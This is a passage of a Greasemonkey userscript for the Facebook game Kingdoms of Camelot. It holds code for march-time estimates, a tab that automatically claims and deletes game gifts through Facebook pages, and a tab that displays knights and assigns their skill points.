      if (baseSpeed == 0) return ret;
      var mmLvl = parseInt(Seed.tech.tch11);//Magical Mapping
      var Speed = 0;
      if (horse){
     //HorsesSiegeSpeed = Base * (1 + MM/10) * (1 + AH/20) 
        var hsLvl = parseInt(Seed.tech.tch12);//Alloy Horse Shoes
        Speed = baseSpeed * (1 + mmLvl/10.0) * (1 + hsLvl/20.0);
      }
      else {
      //FootSpeed = Base * (1 + MM/10)
        Speed = baseSpeed * (1 + mmLvl/10.0);
      }
      //Grid Speed (tiles/second) = Speed (100ths/min) / 6000 
      var gSpeed = 0;
      var estSec;
      if (Speed>0) {
        gSpeed = Speed/6000.0;//0.48333 mm=10, hs=9
        estSec = (parseFloat(dist)/gSpeed).toFixed(0);
      }
      ret.ETA = (parseInt((estSec+''))+30); 
      ret.etaStr = timestr (ret.ETA,1);
      //ret.etaStr = ret.ETA + ', ' + timestr (ret.ETA,1);
      //RS - Cities Relief Station Level
      //Friendly Speed = Speed * (1 + RS/2)
      if (t.ModelCity) {
        cityID = t.ModelCity.id;
        var building = getCityBuilding (cityID, 18);
        if (building) {
          fSpeed = Speed * (1 + parseInt(building.maxLevel)/2);
          gSpeed = fSpeed/6000;
          estSec = (dist/gSpeed).toFixed(0);
          ret.friendETA = parseInt((estSec+''))+30; 
          ret.friendEtaStr = timestr ((ret.friendETA+''),1);
        }
     }
      return ret;
  },
  
};
/***********************************************************************************/
/************ KOC POWER - TABS GIFTS **********************************************/
/*********************************************************************************/
function explodeUrlArgs (url){
  var i = url.indexOf ('?');
  var a = url.substr(i+1).split ('&');
  var args = {};
  for (i=0; i<a.length; i++){
    var s = a[i].split ('=');
    args[s[0]] = s[1];
  }
  return args;
}

// returns: page text or null on comm error
function GM_AjaxPost (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxPost ('+ label +'): ' + url +'\n'+ inspect (args, 5, 1));
  GM_xmlhttpRequest({
    method: "post",
    url: url,
    data: implodeUrlArgs(args),
    headers: { "Content-Type": "application/x-www-form-urlencoded", 'X-Requested-With': 'XMLHttpRequest', 'X-Prototype-Version': '1.6.1',
               'Accept': 'text/javascript, text/html, application/xml, text/xml, */*' },
    onload: function (rslt) {
      if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxPost.onLoad ('+ label +'):\n '  + inspect (rslt, 6, 1));  
      notify (rslt.responseText);
    },
    onerror: function () {
      notify (null);
    },
  });
}

// returns: page text or null on comm error
function GM_AjaxGet (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxGet ('+ label +'): ' + url);
  GM_xmlhttpRequest({
    method: "get",
    url: addUrlArgs(url, args),
    onload: function (rslt) {
      if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxGet.onLoad ('+ label +')  len='+ rslt.responseText.length +':\n '  + inspect (rslt, 6, 1));  
      notify (rslt.responseText);
    },
    onerror: function () {
      notify (null);
    },
  });
}         
  
Tabs.Gifts = {
  tabLabel : culang.gifts,
  tabOrder : StyleOptions.toGeschenke,
  gifts : null,
  myDiv : null,
  doList : [], // list of gifts to accept
  doServer : 0,
  accepting : false,
    
  init : function (div){
    var t = Tabs.Gifts;
	var serverID = getServerId();
    t.myDiv = div;    
    div.innerHTML = '<DIV class=pdxStat>'+culang.Hgift+'</div>	<TABLE cellpadding=0 cellspacing=0 class=pdxTab width=100%><TR>	<TD width=200><a href="http://apps.facebook.com/kingdomsofcamelot/claimGiftUrl?s='+serverID+'" target="_blank"> '+culang.claimGift+'</a> </td>	<TD align=center><INPUT id="pasubGifts" type=submit value="'+culang.GTOsearchBtn+'" \></td>	<TD><a href=https://apps.facebook.com/kingdomsofcamelot/?page=choosegift title="'+culang.sendgifts2+'" target="_blank">'+culang.sendgifts+'</a></td> <TD width=200 align=right> <INPUT id=paGiftHelp type=submit value="'+culang.helpbutton+'"></td>	</tr></table>\
        <DIV id=giftDiv style="width:100%; max-height:650px;">';
    document.getElementById('pasubGifts').addEventListener ('click', t.e_clickedGifts, false);
    document.getElementById('paGiftHelp').addEventListener ('click', t.helpPop, false);
    if (!Options.giftDomains.valid)
      Options.giftDomains.list[getServerId()] = unsafeWindow.domainName;
  },
  
  show : function (){
        var t = Tabs.Gifts;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  hide : function (){
        var t = Tabs.Gifts;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  helpPop : function (){
  var helpText = ''+culang.GThelp+'';
  var pop = new CPopup ('giftHelp', 0, 0, 746, 100, true);
  pop.centerMe (mainPop.getMainDiv());  
  pop.getMainDiv().innerHTML = helpText;
  pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B> '+culang.GTOacceptBtn+'</b></center></div>';
  pop.show (true);
  },
      
  e_clickedGifts : function  (){     // (also cancel accepting)
    var t = Tabs.Gifts;
    if (t.accepting){
      document.getElementById('pasubGifts').value = ''+culang.GTOsearchBtn+'';
      document.getElementById('giftDiv').innerHTML+= '<BR><SPAN class=boldRed>'+culang.canceled+'!</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('giftDiv').innerHTML = '<div class=pdxStat>'+culang.GTOHsearchG+'</div><BR><center><b>'+culang.GTOsearchG+'</b></center>';
    t.fetchGiftsPage (gotGiftsPage);
    function gotGiftsPage(rslt){
      if (rslt.errMsg){
        document.getElementById('giftDiv').innerHTML += rslt.errMsg;
        return;
      }
      t.gifts = rslt;
      if (!Options.giftDomains.valid && t.gifts.length>0){
        t.ajaxGetGiftData (t.gifts[0], listGifts, function (){});    // try to get domain list ... don't delete gift!
        return;
      }
      listGifts();
    }
    
    function listGifts (){  
      var m = '<DIV class=pdxStat><CENTER>'+culang.Hgiftfound+': '+ t.gifts.length +' </center></div>';
      if (t.gifts.length<1){
        document.getElementById('giftDiv').innerHTML = m + ' <BR><CENTER><B>'+culang.GTnogiftsfound+'</b></center>';
        return;
      }
      m += '<TABLE class=pdxTab align=center><TR><TD align=right>'+culang.GTOserver+': </td><TD>'
        + htmlSelector (Options.giftDomains.list, getServerId(), 'id=pbGiftServers') +'</td></tr>\
          <TR><TD align=right>'+culang.deleteb+':</td><TD>'
        + htmlSelector ({y:''+culang.GTOalways+'', e:''+culang.GTOonlyif+'', n:''+culang.GTOnever+''}, Options.giftDelete, 'id=pbGiftDel')
        + '</td></tr><TR><TD></td><TD width=250><INPUT type=submit id=pbGiftDo value="'+culang.GTOacceptBtn+'">\
        &nbsp; <SPAN id=pbGiftNone class=boldRed></span></td></tr></table><HR><center><TABLE class=pdxTab><TR valign=top><TD>\
        <INPUT id=pbGiftButAll type=submit value="'+culang.all+'" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbGiftButNone type=submit value='+culang.none+'></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pdxTabLined>\
        <TBODY id=pbGiftTbody style="max-height:750px; overflow:auto; display:block;">\
        <TR style="font-weight:bold"><TD>'+culang.GTOgift+'</td><TD>'+culang.udate+'</td><TD>'+culang.from+' ('+culang.GTOserver+')</td><TD width=20></td></tr>';
      t.gifts.sort (function (a,b){  // sort by gift name, date
          var x = a.gift.localeCompare (b.gift);
          if (x != 0)
            return x;
          return a.args.da.localeCompare(b.args.da);
          });
      for (var i=0; i<t.gifts.length; i++){
        var giftName = t.gifts[i].gift;
        if (t.gifts[i].args.si == 9)
          giftName += ' (Daily)';
        var date = t.gifts[i].args.da.substr(0,4) +'-'+ t.gifts[i].args.da.substr(4,2) +'-'+ t.gifts[i].args.da.substr(6,2);
        m += '<TR><TD><INPUT type=checkbox id=pbgchk_'+ i +'> &nbsp;'+ giftName +'</td><TD>'+ date +'</td>\
              <TD>'+ t.gifts[i].giver +' ('+ t.gifts[i].args.exs +')</td></tr>';
      }
      document.getElementById('giftDiv').innerHTML = m + '</tbody></table></td></tr></table></center>';
      document.getElementById('pbGiftDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbGiftButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbGiftButNone').addEventListener ('click', t.e_butNone, false);
    }
  },

  e_butAll : function (){
    var t = Tabs.Gifts;
    for (var i=0; i<t.gifts.length; i++)
      document.getElementById('pbgchk_'+i).checked = true;
  },
  
  e_butNone : function (){
    var t = Tabs.Gifts;
    for (var i=0; i<t.gifts.length; i++)
      document.getElementById('pbgchk_'+i).checked = false;
  },
  
  getErDone : function (){
    var t = Tabs.Gifts;
    t.doList = [];
    document.getElementById('pbGiftNone').innerHTML = '';
    Options.giftDelete = document.getElementById('pbGiftDel').value;
    for (var i=0; i<t.gifts.length; i++){
      if (document.getElementById('pbgchk_'+i).checked)
        t.doList.push (t.gifts[i]);
    }
    if (t.doList.length==0){
      document.getElementById('pbGiftNone').innerHTML = ''+culang.GTOnogiftsel+'';
      return;
    }
    t.doServer = document.getElementById('pbGiftServers').value;
    t.accepting = true;
    document.getElementById('pasubGifts').value = ''+culang.GTstopAcc+'';
    document.getElementById('giftDiv').innerHTML = '<div class=pdxStat>'+culang.GTOHacceptG+'</div>	<DIV id=acpDiv style="max-height:750px; overflow:auto"><BR><B><i>'+culang.GTOacceptgift+' '+ t.doList.length +' '+culang.GTOacceptgift2+'</i></b><BR></div>';    
    t.acceptNext ();
  },

    
  allDone : function (msg){
    var t = Tabs.Gifts;
    document.getElementById('acpDiv').innerHTML += ' ' + msg+' <BR>';
    document.getElementById('pasubGifts').value = ''+culang.GTOsearchBtn+'';
    t.accepting = false;
  },
  
  acceptNext : function (){
    var t = Tabs.Gifts;
    var gift = t.doList.shift();
    if (gift == null){
      t.allDone ('<div class=pdxStat>'+culang.Hdone+'</div><center><b>'+culang.GTOacceptok+'</b></center>');
      return;
    }
    var acpDiv = document.getElementById('acpDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>'+ gift.gift +'</b> <i>'+culang.from+'</i> <b>'+ gift.giver +'</b> '+culang.ont+' <b>'+ gift.args.da.substr(0,4) +'-'+ gift.args.da.substr(4,2) +'-'+ gift.args.da.substr(6,2) +'</b>: ';    
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = ''+culang.GTOsearchdata+' ';
    t.ajaxGetGiftData (gift, gotGiftData, progress);
    
    function progress (m){
      if (t.accepting)
        statSpan.innerHTML += ' '+m;
    }
        
    function gotGiftData (rslt){
      if (!t.accepting)
        return;
      if (rslt.ok){
        statSpan.innerHTML += ' &nbsp; <i>'+culang.accept+'</i>';
        t.ajaxAcceptGift (gift, t.doServer, doneAccepting);
        return;
      }
        
      if (rslt.feedback)
        msg = '<B>'+ rslt.feedback + '</b>';
      else
        msg = '<SPAN class=boldRed>'+culang.Herror+': <i>'+ rslt.ajaxErr +'</i></span>';
      if (rslt.del && Options.giftDelete!='n'){
        t.deleteGift (gift);  
        msg += ' <SPAN class=boldRed>'+culang.GTOgiftdeleted+'</span>';
      }
      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();  
    }
    
    function doneAccepting (rslt){
      if (!t.accepting)
        return;
      var msg = '<span class=boldGreen>OK</span>';
      if (rslt.ok)
        actionLog ('<b>'+culang.actionGift +'</b>  '+ gift.gift +' <i>'+culang.from+'</i> <b>'+ gift.giver +'</b> '+culang.actat+' '+ gift.args.da.substr(0,4) +'-'+ gift.args.da.substr(4,2) +'-'+ gift.args.da.substr(6,2)     );
      else
        msg = '<SPAN class=boldRed>'+ rslt.msg +'</span>';
      statSpan.innerHTML = msg;
      if (Options.giftDelete=='y'){
        statSpan.innerHTML += ' &nbsp; <span class=boldRed>'+culang.GTOgiftdelok+'</span>!';
        t.deleteGift (gift);      
      }
      t.acceptNext ();  
    }
  },

  ajaxAcceptGift : function (gift, serverId, notify){
    var url;
    var pargs = {};
        
    if (gift.dat.ver == 1){
      url = gift.dat.url;
      pargs.giftId = gift.dat.giftId;
      pargs.hasExistingServer = 1;
      pargs.serverid = serverId;
      pargs.go = 'Next';
      GM_AjaxPost (url, pargs, ver1GotPost, ''+culang.accept+'');
    } else {
      var i = gift.dat.url.indexOf('src/');
      url = gift.dat.url.substr(0,i) +'src/ajax/claimgift.php?wcfbuid='+ gift.dat.wcfbuid;        
      pargs = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      pargs.fb_sig_ext_perms = unescape(pargs.fb_sig_ext_perms);
      pargs.ver = '2';
      pargs.selectedS = serverId;
      pargs.giftinviteid = gift.dat.giftId;
      GM_AjaxPost (url, pargs, ver2GotPost, ''+culang.accept+'');
     }      
    function ver1GotPost (rslt){
      if (rslt == null){
        notify ({ok:false, msg:"AJAX Error"});
        return;
      }
      var m = /<div class=\'nm\'>(.*?)<\/div/im.exec(rslt);
      if (m)
        notify ({ok:false, msg: 'Erhalten: '+ m[1]});
      else
        notify ({ok:true, msg:'OK'});
    }
    function ver2GotPost (rslt){
      if (rslt == null){
        notify ({ok:false, msg:"AJAX Error"});
        return;
      }
      rslt = eval ('('+ rslt +')');
      if (rslt.ok)
        rslt.msg = 'OK';
      notify (rslt);
    }
  },

  deleteGift : function (gift){
    var pargs = {};   
    for (var i=0; i<gift.inputs.length; i++){
        pargs[gift.inputs[i].name] = gift.inputs[i].value;
    }
    GM_AjaxPost ('http://www.facebook.com/ajax/reqs.php?__a=1', pargs, gotAjaxPost, ''+culang.GTOhide+'');
    function gotAjaxPost (p){
    }
  },
  ajaxGetGiftData : function (gift, notify, progress, DELETE){
    var t = Tabs.Gifts;
    gift.dat = {};
    GM_AjaxGet (gift.submit, null, got1, 'Page 1');        
        
    function got1 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - page 1'});
      progress ('1');
	  page = page.htmlSpecialCharsDecode();
      var m = page.match (/form action="(.*?)"/im);
      if (m == null)
        notify ({ajaxErr:'PARSE Error - page 1'});
	  var url = m[1].htmlSpecialCharsDecode(); 
	    url = unescape(url);
        url = url.replace ('\\/', '/', 'g');
		url = url.replace (/\\u00253A/g, ':');
		url = url.replace (/\\u00257C/g, '|');
	  var signed_request = /signed_request" value="(.*?)"/im.exec (page);
	  var opts = [];
	  opts.signed_request = signed_request[1];
      GM_AjaxPost (url, opts, got2, ''+culang.page+' 2');      
    }
  
  function got2 (page){
      if (page == null)
        notify ({ajaxErr:'COMM '+culang.error+' - '+culang.page+' 2'});
      progress ('2');
	  page = page.htmlSpecialCharsDecode();
      var m = /top.location.href = \"(.*?)\"/im.exec (page);
      if (m == null)
        notify ({ajaxErr:'PARSE '+culang.error+' - '+culang.page+' 2'});
    var url = m[1].htmlSpecialCharsDecode();
      GM_AjaxGet (url, '', got3, ''+culang.page+' 3');        
    }
	
    function got3 (page){
      if (page == null)
        notify ({ajaxErr:'COMM '+culang.error+' - '+culang.page+' 3'});
      progress ('3');
	  page = page.htmlSpecialCharsDecode();
	  var m = page.match (/form action="(.*?)"/im);
      if (m == null)
        notify ({ajaxErr:'PARSE '+culang.error+' - '+culang.page+' 3'});
      var url = m[1].htmlSpecialCharsDecode();
    url = unescape(url);
    url = url.replace ('\\/', '/', 'g');
	  var signed_request = /signed_request" value="(.*?)"/im.exec (page);
    var opts = [];
    opts.signed_request = signed_request[1];
      GM_AjaxPost (url, opts, got4, ''+culang.page+' 4');        
    }
  
 function got4 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - page 4'});
      progress ('4');
	  page = page.htmlSpecialCharsDecode();
	  var m = page.match (/src='(.*?)'/im);
      if (m == null)
        notify ({ajaxErr:'PARSE Error - page 4'});
      var url = m[1].htmlSpecialCharsDecode();
      url = url.replace (/lang=.*?&/, 'lang=en&');  
	  url = url.replace ('\\/', '/', 'g');	
	  url = url.replace ('&amp;', '&', 'g');
	  url = url.replace ('" + (new Date()).getTime() + "', (new Date()).getTime());
      gift.dat.url = url;
      GM_AjaxGet (url, opts, got5, 'Page 5');        
    }
    
    function got5 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - page 5'});
      progress ('5');
	  page = page.htmlSpecialCharsDecode();
      var m = /<div class=\'giftreturned\'>(.*?)<\/div/im.exec(page);
      if (m != null){
        notify ({feedback:culang.GTgiftsendsback, del:true});
        return;
      }
      var m = /(We were unable to find your gift.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:culang.GTunabletofindgift, del:true});
        return;
      }
      var m = /(Unable to get the list of your friends.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:culang.GTunabletogetlist});
        return;
      }
      var m = /(Facebook says you are not friends.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:culang.GTfacebooksaynofriends, del:true});
        return;
      }
            
      var regexp = /<option value='(.*?)'.*?>(.*?)</img ;
      var m;
      while ( (m = regexp.exec (page)) != null){
        if (m[1] != 'noserver')
          Options.giftDomains.list[m[1]] = m[2];  
      }
      Options.giftDomains.valid = true;
      if (page.indexOf('ver:2') >= 0){
        m = /giftinviteid:(.*?),/im.exec(page);
        if (m == null)
          notify ({ajaxErr:'PARSE Error (ver:2, giftinviteid not found) - page 5'});
        gift.dat.giftId = m[1];
        gift.dat.ver = 2;    
      } else {
        m = /name='giftId' value='(.*?)'/im.exec(page);
        if (m == null){
          notify ({ajaxErr:'PARSE Error (ver:1, giftId not found) - page 5'});
          return;
        }
        gift.dat.giftId = m[1];
        gift.dat.ver = 1;
      }
      notify ({ok:true});
    }
  },
 
 
  fetchGiftsPage : function (notify){
    GM_AjaxGet (window.location.protocol+'//www.facebook.com/games?ap=1', '', parseGiftsPage, 'FB Gifts Page');
   
    function parseGiftsPage  (p){
      if (p == null)
        notify ({errMsg:'Ajax Comm Error'});
      p = p.htmlSpecialCharsDecode();
      var t = Tabs.Gifts;
      var gifts = [];
      try {    
        var m = p.split ('<form');  
        for (var i=0; i<m.length; i++){
          if ( m[i].indexOf('kingdomsofcamelot')<0)
            continue;
	var getgift = ['.*?(?:would like to give you a (?:gift of|)(.*?) in |Here is a(.*?)you can use)', '.*?(?:in (.*?) Hurry and claim)', '.*?(?:machen: (.*?) Beeil)', , '.*?(?:pesante a (.*?) Sbrigati e reclamare)', '.*?(?:voudrait t\'offrir un (.*?) dans)', '.*?(?:quiere darle un regalo de (.*?) en Reinos de Camelot)', '.*?(?:sana (.*?) hediyesi vermek istiyor)',];
	var co = 0;
		  var mm = m[i].match( /facebook.com\/.*\">(.*?)<\/a><\/span>.*?(?:machen: (.*?) Beeil)'/im );
		  while (mm==null && co<getgift.length){
			var exp = new RegExp('facebook.com\/.*\">(.*?)<\/a><\/span>'+getgift[co], 'im');
			mm = m[i].match(exp);
			co++;
		  }		
			// if (mm==null)
			// mm = m[i].match( /appRequestBodyNewA\">(.*) sent an you an invitation to use Kingdoms of Camelot/im );
			// if (mm==null)
			// mm = m[i].match( /appRequestBodyNewA\">(.*) utiliser Kingdoms of Camelot/im ); 
			// if (mm==null)
			// mm = m[i].match( /appRequestBodyNewA\">(.*) dir eine Einladung geschickt/im ); 
 
			if (mm==null)
				continue;
          var giver = mm[1];
          if (mm[2])
          var gift = mm[2].trim();
          // else
          // var gift = mm[3].trim();
       
          // get all inputs ...  (name, value, type)          
          var inps = [];
          var args = {};  
          var inpsub = null;            
          var ins = m[i].match (/<input.*?>/igm);
          for (var ii=0; ii<ins.length; ii++){
            var it = {};
            mm = /value=\"(.*?)\"/im.exec(ins[ii]);
			if (mm==null)
				continue;
            it.value = mm[1];
            mm = /name=\"(.*?)\"/im.exec(ins[ii]);
            if (mm==null)
				continue;
            it.name = mm[1];
            mm = /type=\"(.*?)\"/im.exec(ins[ii]);
            if (mm==null)
				continue;
            it.type = mm[1];
            if (it.type=='submit' && it.name!='actions[reject]'){
              it.name = eval ('"'+ it.name +'"');          
              mm = /actions\[(.*?)\]/im.exec(it.name);
              inpsub = mm[1].replace('\\/', '/', 'g');
              inpsub = inpsub.replace('&amp;', '&', 'g');
              var a = inpsub.split ('&');
              for (var iii=0; iii<a.length; iii++){
                var aa = a[iii].split ('=');
                if (aa[0]=='da' || aa[0]=='si'){
                  args[aa[0]] = unescape(aa[1]);
                } else if (aa[0] == 'ex') {
                  var s = unescape(aa[1]).split ('|');
                  for (var iiii=0; iiii<s.length; iiii++){
                    var ss = s[iiii].split(':');
                    if (ss[0] == 's')
                      args.exs = ss[1];
					  else
					  args[ss[0]] = ss[1];
                  }
                }
              }
			  if(args.gid)
			  gift = unsafeWindow.itemlist['i'+args.gid].name;
            } else {
              inps.push (it);
            }
          }
          if (args.da)
            gifts.push ({giver:giver, gift:gift, args:args, submit:inpsub, inputs:inps});
        }
        notify (gifts);
      } catch (e) {
        notify ({errMsg:"Error parsing Facebook gift page "+ e});
      }
    }
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS KIGHTS *********************************************/
/*********************************************************************************/
Tabs.Ritter = {
  tabOrder : StyleOptions.toRitter,
  tabLabel : culang.knights,
  div : null,
  displayTimer:	null,
  action : 0,
  tabDisabled : StyleOptions.disKnightsTab, 
  state : null,

	init: function (div){
		var t = Tabs.Ritter;
		t.div = div;
		unsafeWindow.ptAssignSkill = t.clickedAssignPoints;
		unsafeWindow.ptAssignTunes = t.clickedAssignTune;
		t.div.innerHTML = '<STYLE>table.pdxTabPad tr.ptwpad {background-color:#ffffff; padding-left:15px}</style><DIV id=ptknightdiv style="max-height:760px; height:660px; overflow-y:auto">';
		t.show();
	},
	
  getContent : function (){
    var t = Tabs.Ritter;
    return t.div;
  },
 
hide: function (){
	var t = Tabs.Ritter;
    clearTimeout (t.displayTimer);
},

show: function (){
		var t = Tabs.Ritter;
		clearTimeout (t.displayTimer);
		if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
	
			if (t.state == null){
      t.div.innerHTML = '<STYLE>table.pdxTabPad tr.ptwpad {background-color:#ffffff; padding-left:5px}</style>            <DIV id=ptknightdiv style="max-height:760px; height:660px; overflow-y:auto">';
      t.state = 1;
    }
	
  function _dispKnight (roleId, knight, numcid){
      var rid = roleId;
      if (roleId==null)
        rid = 1;
      var sty='';  
      if (row++ % 2)
        sty = 'class=ptOddrow ';        
      m = '<TR '+ sty +'valign=top align=right><TD><font size=1><B>'+ (roleId==null ? '':knightRoles[rid][0]) +'</b></td><TD align=left>';
      if (knight == null) {
        m += '--------</td><TD colspan=5></td><TD class=pdxEntry colspan=5></td><TD colspan=2></td></tr>';
      } else {
        var level = parseInt(Math.sqrt(parseInt(knight.experience) / 75)) + 1;
        var unpoints = level - parseInt(knight.skillPointsApplied);
        var salary = (parseInt(knight.skillPointsApplied) + 1) * 20;
        totSalary += salary;
        var ass = '';
        if (knight.knightStatus == 10){
          ass = '<TD class=pdxEntry align=left colspan=4>'+culang.march+'</td>';
        } else {  
          if (unpoints > 0){
            unpoints = '<SPAN class="boldRed">'+ unpoints +'</span>';
            for (var i=0; i<4; i++){
            var sty = 'padding-left:1px;';
            if (i == rid) {  // bold it
              sty += 'font-weight:bold;color:#116654';
              if (t.action==1) {   
	          t.clickedAssignPoints(null, cid,knight.knightId,i);
              }
              if (t.action==2) {   
	          t.clickedAssignPoints(null, cid,knight.knightId,1);
              }
            }
            ass += '<TD class=pdxEntry align=left style="'+ sty +'" ><A style="'+ sty +'" onclick="ptAssignSkill(this,' + cid +','+ knight.knightId +','+ i +')">['+ knightRoles[i][2] +'] &nbsp;</a></td>'; 
           }
          } 
          else
            ass = '<TD class=pdxEntry colspan=4></td>';
        }  
        var skills = [];
        for (var i=0; i<4; i++){
          if (i == rid)
            skills[i] = '<B>'+ knight[knightRoles[i][1]] +'</b>'; 
          else
            skills[i] = knight[knightRoles[i][1]]; 
        }   
        var item211="0";
        var item221="0";
        var item231="0";
        var item241="0";
        if (Seed.items.i211) item211='<a onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ boost_modal(1,'+ knight.knightId +');return false;}, 500);">'+Seed.items.i211+'</a>';
        if (Seed.items.i221) item221='<a onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ boost_modal(2,'+ knight.knightId +');return false;}, 500);">'+Seed.items.i221+'</a>';
        if (Seed.items.i231) item231='<a onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ boost_modal(3,'+ knight.knightId +');return false;}, 500);">'+Seed.items.i231+'</a>';
        if (Seed.items.i241) item241='<a onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ boost_modal(4,'+ knight.knightId +');return false;}, 500);">'+Seed.items.i241+'</a>';
        m += '<a title="'+culang.role+'" onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ assign_role_modal('+ knight.knightId +');return false;}, 500);">' + knight.knightName.substring(0,20) + '</a></td><TD><a title="'+culang.exppoints+'" onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){  xpBoost_modal('+ knight.knightId +');return false; }, 500);" href="javascript:void(0)">'+ level +'</a></td><TD>'+ skills[0] +' ('+item211+')</td><TD>'+ skills[1] +' ('+item221+')</td><TD>'+ skills[2] +' ('+item231+')</td><TD>' + skills[3]
          +' ('+item241+')</td><TD class=pdxEntry>'+ unpoints +'</td>'+ ass +'<td><a onclick="citysel_click(document.getElementById(\'citysel_'+ (numcid+1)+'\'));setTimeout (function (){ loyalBoost_modal('+ knight.knightId +');return false;}, 500);" colspan=2>'+knight.loyalty+'</a><img onclick="ptAssignTunes(' + cid +','+ knight.knightId +');" src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_16.png" title="'+culang.loyboost+'"></td><TD>'+ addCommas(salary) +'</td></tr>';
      }
      return m;
    }          
    	
    var totSalary = 0;
    var m = '<TABLE cellspacing=0 align=center class=pdxTabPad><TBODY><TR><td colspan=15><DIV class=pdxStat>'+culang.HknightS+'</div><BR>'+culang.Ogivepoints+'  <input style="height:20px;font-size:9px;" type=button value="'+culang.SDefault+'" id="assignDefaultPoints"><input style="height:20px;font-size:9px;" type=button value="'+culang.combat+'" id="assignCombatPoints"> <b>(</b>'+culang.maxRoles+'<b>)</b><BR><span class=boldRed>'+culang.impnote+':</span> '+culang.kntImpNote+'</td></tr>';
    for (var c=0; c<Cities.numCities; c++) {
      var cid = Cities.cities[c].id;
      m += '<tr><TD colspan=15><DIV class=pdxStat>'+ Cities.cities[c].name +'</div></td></tr>\
          <TR class=ptwpad style="font-weight:bold" align=right><TD width=70>'+culang.role+'</td><TD width=140 align=center>'+culang.player+'</td><TD width=22 style="padding:3px">'+culang.lvl+'</td><TD width=25 style="padding:3px">'+culang.shrpolitics+'</td><TD width=25>'+culang.combat+'</td>\
          <TD width=25 style="padding:3px">'+culang.shrint+'</td><TD width=25 style="padding:3px">'+culang.shrres+'</td><TD width=75 align=center colspan=5 style="padding-left:20px padding-right:20px"> -[ '+culang.Hpoints+' ]- </td><td witdh=25 colspan=1 style="padding:2px"> '+culang.bounty+' </td><TD width=40 align=right> '+culang.salary+' </td></tr>';
      totSalary = 0;
      var did = {}; 
      var row = 0;
      for (var i=0; i<knightRoles.length; i++){
        var leader = Seed.leaders['city'+cid][knightRoles[i][1]+'KnightId'];
        if (leader == 0)
          m += _dispKnight (i, null, c);
        else {
          m += _dispKnight (i, Seed.knights['city'+cid]['knt'+leader], c);
          did['knt'+leader] = true;
        }
      }
      var list = [];
      for (k in Seed.knights['city'+cid]){
        if (!did[k])
          list.push (Seed.knights['city'+cid][k]);
      }
      list.sort (function (a,b){return parseInt(b.combat)-parseInt(a.combat)});
      for (i=0; i<list.length; i++)
        m += _dispKnight (null, list[i], c);
       m += '<TR align=right><TD colspan=13><B>'+culang.totals+':</b></td><TD>'+ addCommas(totSalary) +'</td></tr>';        
    }
    document.getElementById('ptknightdiv').innerHTML = m +'</tbody></table></div>';
    t.action = 0;
    but = document.getElementById('assignDefaultPoints');
    but.addEventListener ('click', function (){
      t.action=1;
      t.show();
    }, false);
    but = document.getElementById('assignCombatPoints');
    but.addEventListener ('click', function (){
          t.action=2;
          t.show();
    }, false);
    t.displayTimer = setTimeout (t.show, 10000);
  },

  clickedAssignTune: function(cid, kid) {
    var t = Tabs.Ritter;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.cid = cid;
        params.kid = kid;
      params.rid=0;
      params.standalone=0;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/rewardKnight.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
       if (rslt.ok) {
         var knight = Seed.knights["city" + cid]["knt" + kid];
         knight.loyalty = parseInt(knight.loyalty) + 5;    
        }
      },
      onFailure: function () {
      }, 
    });
  },  
	clickedAssignPoints: function (e, cid, kid, rid){
		var t = Tabs.Ritter;
		clearTimeout (t.displayTimer);

    var knight = Seed.knights['city'+cid]['knt'+kid];
    if (knight.knightStatus == 10 && e!=null){
      var row = e.parentNode.parentNode;
      row.childNodes[7].innerHTML = ''+culang.march+'';
      return; 
    }
    sk = [];
    var unassigned = parseInt(Math.sqrt(parseInt(knight.experience)/75)) + 1  - parseInt(knight.skillPointsApplied);        
    for (var i=0; i<4; i++){
	sk[i] = parseInt(knight[knightRoles[i][1]]);
	if (i == rid) {
	if ((sk[i]+unassigned)>=255) {
	unassigned=255-sk[i];
	sk[i]=255;
	}else{ 
    sk[i] += unassigned;
    }
  }
}
	if (unassigned==0) return;
    if (e!=null) {
    var row = e.parentNode.parentNode;
